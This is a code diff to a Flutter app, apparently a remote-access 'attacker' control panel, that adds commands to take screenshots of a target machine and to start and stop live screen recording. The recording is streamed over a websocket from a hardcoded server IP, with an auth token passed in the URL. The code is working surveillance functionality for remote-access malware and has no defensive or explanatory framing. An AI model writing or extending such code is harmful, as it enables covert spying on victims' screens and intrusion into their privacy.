@@ -1,13 +1,21 @@
+import 'dart:convert';
+import 'dart:typed_data';
+
 import 'package:flutter/material.dart';
 import 'package:get/get.dart';
 import 'package:inferno_core_fyp/models/file_model.dart';
 import 'package:inferno_core_fyp/models/process_model.dart';
 import 'package:inferno_core_fyp/res/helper_extensions.dart';
+import 'package:inferno_core_fyp/view%20models/controllers/target_controller.dart';
+import 'package:inferno_core_fyp/view/controls/screen_monitor.dart';
 
 import '../../models/account_model.dart';
 import '../../models/hardware_info_model.dart';
 import '../../models/programs_model.dart';
+import '../../res/app_urls.dart';
+import '../../utils/util_functions.dart';
 import '../../utils/utils.dart';
+import '../../view/show_file.dart';
 import 'io_attacker_controller.dart';
 
 class GeneralController extends GetxController {
@@ -64,6 +72,7 @@ class GeneralController extends GetxController {
   final commonController = TextEditingController().obs;
 
   IoAttackerController ioAttackerController = Get.put(IoAttackerController());
+  TargetController targetController = Get.put(TargetController());
 
   Future<void> getSystemInfo(String targetId) async {
     await Future.delayed(const Duration(seconds: 1));
@@ -348,5 +357,60 @@ class GeneralController extends GetxController {
     } catch (e) {
       Utils.toastMsg("Error: $e");
     }
+  }
+
+  Future takeScreenShot(String targetId) async {
+    try {
+      Map<String, dynamic> response = await ioAttackerController.executeCommand(
+        targetId: targetId,
+        data: {"text": "SCREENSHOT", "command_args": {}},
+      );
+      String imageBase64 = response["result"]["image"];
+      Uint8List fileBytes = base64.decode(imageBase64);
+      Get.to(
+        () => ShowFile(
+          appBarTitle: 'ScreenShot',
+          fileBytes: fileBytes,
+          isImage: true,
+          onPressed: () => targetController.downloadFile(
+            fileBytes: fileBytes,
+            fileName: "screenshot",
+            extension: "png",
+          ),
+          onPressedShared: () => targetController.shareFile(
+            fileBytes: fileBytes,
+            fileName: "screenshot",
+            extension: "png",
+          ),
+        ),
+      );
+    } catch (error) {
+      Utils.toastMsg("Error: $error");
+    }
+  }
+
+  Future startScreenMonitoring(String targetId) async {
+    Utils.showLoadingDialog('Executing...');
+    await ioAttackerController.submitCommand(
+      targetId: targetId,
+      data: {
+        "text": "START_SCREEN_RECORDING",
+        "command_args": {"monitor_number": 1}
+      },
+    );
+    String? idToken = await getIdToken();
+
+    String socketUrl = 'ws://34.100.163.13/io-attacker/ws/listen?auth_token'
+        '=$idToken&command_id=${ioAttackerController.commandId}&target_id=$targetId';
+    Utils.dismissLoadingDialog();
+    Get.to(
+        () => ScreenMonitoringPage(targetId: targetId, socketUrl: socketUrl));
+  }
+
+  Future<void> stopScreenMonitoring(String targetId) async {
+    await ioAttackerController.submitCommand(
+      targetId: targetId,
+      data: {"text": "STOP_SCREEN_RECORDING", "command_args": {}},
+    );
   }
 }
